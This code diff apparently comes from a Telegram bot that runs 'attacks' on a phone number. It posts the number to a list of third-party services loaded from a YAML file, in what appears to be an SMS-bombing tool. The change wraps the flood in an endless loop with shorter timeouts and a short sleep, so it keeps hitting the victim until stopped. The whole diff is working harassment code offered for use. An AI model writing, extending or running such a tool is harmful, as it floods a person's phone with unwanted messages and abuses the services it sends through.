@@ -1,5 +1,6 @@
 from json import loads
 from pathlib import Path
+from asyncio import sleep
 from aiohttp import ClientSession
 
 import yaml
@@ -22,41 +23,42 @@ class Attack:
             "Accept": "*/*"}
 
     async def attack(self, message: Message, phone: int):
-        await self.start_process(phone)
         response = api.run_attack(message.from_user.id, phone)
         attack_id = response.get("id")
         attack_uuid = response.get("uuid")
         if not attack_id:
             return await message.answer("Данная атака уже существует!")
-        await self.start_process(phone)
         page = (F"Атака началась <b>#{attack_id}</b>")
         reply_markup = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(
                 text="Остановить", callback_data=F"stop#{attack_uuid}")]
         ])
-        return await message.answer(page, reply_markup=reply_markup)
+        await message.answer(page, reply_markup=reply_markup)
+        await self.start_process(phone)
 
     async def start_process(self, phone: int):
         services = self.load_services()
-        for k, v in services.items():
-            try:
-                if not v["formating"]:
-                    if "data" in v:
-                        data = (v["data"] %
-                                phone).replace("'", "\"")
-                        await self.session.post(url=k, data=loads(data),
-                                                headers=self.headers, timeout=3)
-                    elif "json" in v:
-                        json = (v["json"] %
-                                phone).replace("'", "\"")
-                        await self.session.post(url=k, json=loads(json),
-                                                headers=self.headers, timeout=3)
-                else:
-                    await self.session.post(url=k % phone, timeout=3)
-            except TypeError:
-                pass
-            except Exception as e:
-                pass
+        while True:
+            for k, v in services.items():
+                try:
+                    if not v["formating"]:
+                        if "data" in v:
+                            data = (v["data"] %
+                                    phone).replace("'", "\"")
+                            await self.session.post(url=k, data=loads(data),
+                                                    headers=self.headers, timeout=1)
+                        elif "json" in v:
+                            json = (v["json"] %
+                                    phone).replace("'", "\"")
+                            await self.session.post(url=k, json=loads(json),
+                                                    headers=self.headers, timeout=1)
+                    else:
+                        await self.session.post(url=k % phone, timeout=3)
+                except TypeError:
+                    pass
+                except Exception as e:
+                    pass
+            await sleep(3)
 
     def load_services(self):
         with open(rF"{SERVICES_FOLDER}/services.yaml", "r") as f:
